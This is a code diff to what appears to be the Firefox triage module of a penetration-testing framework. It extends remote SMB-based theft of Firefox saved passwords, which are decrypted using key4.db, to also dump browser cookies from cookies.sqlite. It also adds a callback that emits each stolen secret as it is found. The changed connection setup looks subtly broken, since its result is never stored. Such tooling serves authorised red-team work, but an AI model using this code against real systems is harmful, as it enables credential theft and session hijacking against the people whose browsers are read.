@@ -7,9 +7,13 @@ import ntpath
 from os import remove
 import sqlite3
 import tempfile
+from dataclasses import dataclass
+from typing import Any
 from Cryptodome.Cipher import AES, DES3
 from pyasn1.codec.der import decoder
 from dploot.lib.smb import DPLootSMBConnection
+
+from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 CKA_ID = unhexlify("f8000000000000000000000000000001")
 
@@ -21,6 +25,16 @@ class FirefoxData:
         self.username = username
         self.password = password
 
+@dataclass
+class FirefoxCookie:
+    winuser: str
+    host: str
+    path: str
+    cookie_name: str
+    cookie_value: str
+    creation_utc: str
+    expires_utc: str
+    last_access_utc: str
 
 class FirefoxTriage:
     """
@@ -41,23 +55,19 @@ class FirefoxTriage:
         "All Users",
     )
 
-    def __init__(self, target, logger, conn: DPLootSMBConnection = None):
+    def __init__(self, target, logger, conn: DPLootSMBConnection = None, per_secret_callback: Any = None):
         self.target = target
         self.logger = logger
         self.conn = conn
 
-    def upgrade_connection(self, connection=None):
-        self.conn = DPLootSMBConnection(self.target)
-        if connection is not None:
-            self.conn.smb_session = connection
-        else:
-            self.conn.connect()
+        self.per_secret_callback = per_secret_callback
 
-    def run(self):
+    def run(self, gather_cookies=False):
         if self.conn is None:
-            self.upgrade_connection()
+            upgrade_to_dploot_connection(target=self.target)
 
         firefox_data = []
+        firefox_cookies = []
         # list users
         users = self.get_users()
         for user in users:
@@ -71,6 +81,11 @@ class FirefoxTriage:
                 continue
             for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
                 try:
+                    if gather_cookies:
+                        cookies_path = ntpath.join(self.firefox_generic_path.format(user), d.get_longname(), "cookies.sqlite")
+                        cookies_data = self.conn.readFile(self.share, cookies_path)
+                        if cookies_data is not None:
+                            firefox_cookies += self.parse_cookie_data(user, cookies_data)
                     logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
                     logins_data = self.conn.readFile(self.share, logins_path)
                     if logins_data is None:
@@ -79,7 +94,7 @@ class FirefoxTriage:
                     if len(logins) == 0:
                         continue  # No logins profile found
                     key4_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\key4.db"
-                    key4_data = self.conn.readFile(self.share, key4_path, bypass_shared_violation=True)
+                    key4_data = self.conn.readFile(self.share, key4_path)
                     if key4_data is None:
                         continue
                     key = self.get_key(key4_data=key4_data)
@@ -94,19 +109,44 @@ class FirefoxTriage:
                         decoded_username = self.decrypt(key=key, iv=username[1], ciphertext=username[2]).decode("utf-8")
                         password = self.decrypt(key=key, iv=pwd[1], ciphertext=pwd[2]).decode("utf-8")
                         if password is not None and decoded_username is not None:
-                            firefox_data.append(
-                                FirefoxData(
+                            data = FirefoxData(
                                     winuser=user,
                                     url=host,
                                     username=decoded_username,
                                     password=password,
                                 )
-                            )
+                            if self.per_secret_callback is not None:
+                                self.per_secret_callback(data)
+                            firefox_data.append(data)
                 except Exception as e:
                     if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                         continue
                     self.logger.exception(e)
         return firefox_data
+
+    def parse_cookie_data(self, windows_user, cookies_data):
+        cookies = []
+        fh = tempfile.NamedTemporaryFile(delete=False)
+        fh.write(cookies_data)
+        fh.seek(0)
+        db = sqlite3.connect(fh.name)
+        cursor = db.cursor()
+        cursor.execute("SELECT name, value, host, path, expiry, lastAccessed, creationTime FROM moz_cookies;")
+        for name, value, host, path, expiry, lastAccessed, creationTime in cursor:
+            cookie = FirefoxCookie(
+                    winuser=windows_user,
+                    host=host,
+                    path=path,
+                    cookie_name=name,
+                    cookie_value=value,
+                    creation_utc=creationTime,
+                    last_access_utc=lastAccessed,
+                    expires_utc=expiry,
+                )
+            if self.per_secret_callback is not None:
+                self.per_secret_callback(cookie)
+            cookies.append(cookie)
+        return cookies
 
     def get_login_data(self, logins_data):
         json_logins = json.loads(logins_data)
